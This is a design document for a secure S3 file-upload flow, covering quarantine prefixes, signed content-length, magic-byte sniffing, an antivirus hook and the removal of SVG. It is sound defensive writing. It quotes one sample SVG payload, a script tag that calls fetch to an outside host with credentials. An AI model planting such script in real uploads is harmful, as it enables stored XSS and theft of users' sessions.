# File uploads

An upload is a presigned `PUT` the browser makes directly to S3, followed by a
server-side verification step that decides whether the object becomes readable.
This document is about the second half, why it exists, and the two things it
still cannot do.

## What was here before

The upload path had three checks on the content type and not one of them looked
at the file:

- `ImageUpload` read `file.type`, which the browser derives from the filename's
  extension.
- The Zod schema on `getPresignedUploadUrlAction` checked that string against an
  allowlist.
- `createPresignedUploadUrl` signed it into the presigned URL.

All three are the same fact, asserted by the caller, repeated three times.
Signing it was worth something — it stops a URL minted for a PNG being reused
for another type — but it also means the declared type becomes the object's
stored `Content-Type`, which is the header S3 serves the bytes back with. So the
allowlist was not deciding what got stored; it was deciding what a caller's
arbitrary bytes would later be _labelled_ as. Renaming `payload.html` to
`payload.png` was the entire bypass.

The size cap had the same shape and was worse, because it looked enforced. The
schema validated `sizeBytes` and then dropped it on the floor: the presigned URL
signed `content-type;host` over an `UNSIGNED-PAYLOAD`, so the URL it minted
authorised a PUT of **any length whatsoever**. A caller declaring one byte could
write five gigabytes with it, and every check in the process had passed. The 5 MB
limit existed in three places — the client, the schema, a constant — and bound
nothing.

And the presign handed back `publicUrl`. That is the shape of the problem rather
than a detail of it: the caller received a public address for an object whose
bytes nothing had looked at, at the moment the URL was minted, before the upload
had even happened.

## The flow now

```
                                    ┌─────────────────────────────────┐
  1. getPresignedUploadUrlAction    │ validates type + size           │
     ─────────────────────────────▶ │ mints  quarantine/<user>/<uuid> │
     { uploadUrl, key }         ◀── │ signs  content-type,            │
       (no readable URL)            │        content-length           │
                                    └─────────────────────────────────┘
  2. PUT uploadUrl ────────────────▶ S3   (a body of any other length
                                          fails the signature)
                                    ┌─────────────────────────────────┐
  3. finalizeUploadAction           │ key must be under the caller's  │
     ─────────────────────────────▶ │   own quarantine prefix         │
                                    │ GET Range: bytes=0-511          │
                                    │   ├─ length  vs cap, vs signed  │
                                    │   ├─ sniff   vs stored type     │
                                    │   └─ scan    (hook)             │
     { publicUrl, scanned }     ◀── │ COPY → uploads/…, DELETE source │
                                    └─────────────────────────────────┘
```

Two prefixes, not one plus a flag. The property worth having is "an unverified
object is not reachable at a public URL", and a prefix is something a bucket
policy can act on. With one prefix the object would sit at its final URL for as
long as verification takes, and an unguessable key is secrecy, not a boundary.

## The four checks, in order

Each is cheaper than the next, and each makes the next meaningful.

### 1. Length, measured

Taken from the readback's `Content-Range` — a range request is the cheapest way
to learn the whole object's size, since the total after the slash is already in
the response. It is checked twice: against the 5 MB cap, and against the size the
upload was _signed_ for.

The second comparison is not pedantry. `content-length` is signed into the upload
URL, so S3 should have refused a PUT of any other length. A mismatch means either
that binding is not doing what this code believes it does, or the object was
written by something other than the URL this application minted. Either one
invalidates the cap, so the object goes.

### 2. Type, sniffed

`src/lib/uploads/sniff.ts` reads the leading bytes against the documented headers
of the four formats — JPEG's `FF D8 FF`, PNG's eight-byte signature, `GIF87a` /
`GIF89a`, and `RIFF….WEBP`. It is an allowlist of signatures, not a blocklist of
known-bad magic numbers, because the question is never "is this dangerous" but
"is this one of the four formats we serve", and the interesting files are the ones
nobody has thought of.

The sniffed type is compared against the type **S3 stored**, not against a type
the caller re-declares on finalize. `finalizeUploadAction` deliberately takes no
content type: a caller who could supply one could supply the one matching their
own bytes, and the check would confirm a fact of their choosing. The stored header
is what a browser will eventually be told these bytes are, so it is the only side
of the comparison worth having.

### 3. Scan

The antivirus hook. See below.

### 4. Promote

Copy to the public prefix with the **sniffed** type as the object's
`Content-Type`, then delete the quarantine copy. In that order: a failed copy
leaves the object where it was rather than deleting the only copy of something
that passed every check.

Every refusal deletes the quarantined object, the infected one included. There is
no "keep it for analysis" branch, because that is a decision about someone's
malware retention policy and the wrong default for a boilerplate is the one that
hoards it.

## Why `image/svg+xml` is no longer accepted

It was on the allowlist, and it is the one type there that content sniffing
cannot help with. Every check above reduces to "do the bytes agree with the
declared type", and an SVG that carries
`<script>fetch("https://…", {credentials:"include"})</script>` agrees perfectly:
it is a well-formed SVG. There is no byte pattern separating a drawing from a
document, because in SVG they are the same format.

What makes that matter is where the bytes are served from. An object is fetched
with the `Content-Type` the PUT signed, so a stored `image/svg+xml` is handed to
the browser as a document to parse and its scripts run in the **bucket's** origin:

- On a raw `bucket.s3.region.amazonaws.com` URL, that origin shares nothing with
  the application, and the damage is a phishing page on a domain the organisation
  owns.
- Behind the CDN alias most deployments put in front of a bucket —
  `cdn.example.com` — it is same-site.
- On the application's own host, it is stored XSS with the session cookie
  attached.

Which of those a deployment has is not something this repository can know, and it
is not a question the upload path should be answering by default.

Re-enabling it is deliberately **not** an environment variable: a flag that
switches stored XSS back on is a footgun with a label on it. A deployment that
needs user SVG needs a sanitiser that parses the document and strips script,
event handlers, external references and `foreignObject` — not an allowlist entry.
Rule R1 of `scripts/assert-upload-validation.ts` refuses any accepted type the
sniffer has no signature for, so the list cannot grow back past the sniffer by
accident, and there is no signature that could be written for SVG.

## The antivirus hook

`src/lib/uploads/scan.ts` is a seam, not an engine. There is no credible way to
ship malware detection in a Node dependency: the engines that exist are native,
they need a signature database that updates daily, and a boilerplate that vendored
one would be shipping a stale database with a version number on it. What a
boilerplate can get right is the shape — where the call goes, what it is allowed
to say, and what the upload path does with each answer.

The scanner is handed a **location**, not the bytes:

```
POST $UPLOAD_SCANNER_URL
Authorization: Bearer $UPLOAD_SCANNER_API_KEY     (when set)
Content-Type: application/json

{ "bucket": "…", "key": "quarantine/…", "declaredType": "image/png",
  "sizeBytes": 4096 }

→ { "status": "clean" }
→ { "status": "infected", "signature": "Eicar-Test-File" }
```

Every deployment shape worth having — a Lambda on an S3 event, ClamAV in a sidecar
with the bucket mounted, a vendor API taking a presigned URL — reads the object
itself. So the readback here stays bounded to the 512 header bytes the sniffer
needs, and the scanner does its own I/O.

### Fail open or fail closed

Both, decided by whether a scanner is configured, because one answer is wrong in
each direction:

| verdict       | scanner configured | no scanner configured |
| ------------- | ------------------ | --------------------- |
| `clean`       | accept             | accept                |
| `infected`    | refuse             | refuse                |
| `unavailable` | **refuse**         | accept, log `warn`    |

- Fail closed always, and a fresh clone with no `UPLOAD_SCANNER_URL` rejects every
  upload. The feature ships broken, and the first person to hit it fixes it by
  taking the check out.
- Fail open always, and the deployment that configured a scanner keeps accepting
  uploads when it goes down. That is the bug this hook exists to prevent: an
  outage silently becomes an absence of scanning, and nothing in the system
  distinguishes "clean" from "not asked".

`unavailable` is a distinct verdict from `clean` for the same reason. A scanner
that reports a timeout as clean is worse than no scanner, because it produces the
audit line of a scan that happened. An unrecognised response body is
`unavailable`, never `clean`, so a scanner that changes its response format fails
closed rather than passing everything.

### The unscanned state is loud

With no scanner configured, every accepted upload writes:

```json
{
  "event": "upload.accepted",
  "level": "warn",
  "key": "uploads/…",
  "type": "image/png",
  "sizeBytes": 4096,
  "scanner": "none",
  "scanned": false
}
```

`scanned` is present and `false` rather than absent, so "what went into the bucket
without being scanned" is an equality query rather than a missing-key test. The
flag is also returned to the caller and shown in the UI, because the person
looking at the result is entitled to know, rather than it being a line in a log
they will never read.

## What the bucket policy has to do

This repository cannot set your bucket policy, and two of its properties are
load-bearing:

1. **The quarantine prefix must not be publicly readable.** It is the entire
   point of the two-prefix split. If `quarantine/*` is public, an unverified
   object is reachable by anyone who learns its key.
2. **A lifecycle rule should expire the quarantine prefix** — a day is plenty.
   Objects are left there by the two paths that deliberately do not delete: an
   upload that was never finalized (the browser closed), and one whose readback
   failed, where the object's state is unknown and issuing a delete for a key
   whose read just failed is as likely to be a no-op as a cleanup.

A third is a deployment decision rather than a rule: if the public prefix is
fronted by a CDN alias on your application's domain, accepted uploads are
same-site content. That is the reasoning behind the SVG decision above, and it is
worth re-reading it with your own origins in mind.

## What is not done

- **S3's enforcement of the signed `content-length` is not verified here.** The
  canonical request is asserted by `src/lib/s3.test.ts` — the header is signed,
  and the signature changes when the length does — but no test in this repository
  puts a body of the wrong length in front of a real bucket, because there are no
  credentials in CI. The behaviour relied on is that S3 recomputes the signature
  from the headers it received and answers `SignatureDoesNotMatch` on a mismatch.
  The measured cap in step 1 is the reason this is belt-and-braces rather than the
  only line of defence: if that binding ever fails to hold, the readback catches
  it and records a `size-mismatch`.
- **A polyglot declared as the format it leads with is stored as that format.**
  Bytes that really are a valid GIF are a valid GIF. What stops them being
  interpreted as script is the `Content-Type` they are served with and
  `X-Content-Type-Options: nosniff` — both of which are in place — not the
  sniffer. What the sniffer does catch is the same payload declared as something
  _else_, which is the case a rename produces.
- **Nothing re-checks an object after it is promoted.** A signature database that
  learns about a file tomorrow has no way to act on one accepted today; that needs
  an S3-event scanner re-reading the public prefix, which is a deployment
  component rather than application code.
- **Image dimensions are not bounded.** A 5 MB PNG can decode to an enormous
  bitmap, and this path checks bytes rather than pixels. Nothing here decodes an
  upload, so the exposure is to whatever downstream does — `next/image` fetches
  these URLs, and the optimiser's own limits apply.

## Running the gate

```
tsx scripts/assert-upload-validation.ts
```

Seven rules, each checked against the regression it names by breaking a copy of
the tree — see `scripts/assert-upload-validation.test.ts`. They exist because
every one of these properties can be lost while the feature goes on working: take
the sniff out and every upload succeeds, faster; put SVG back and SVG uploads
start working, which looks like a feature; drop the user-id comparison in
`finalizeUploadAction` and nothing changes for any caller who is not attacking it.
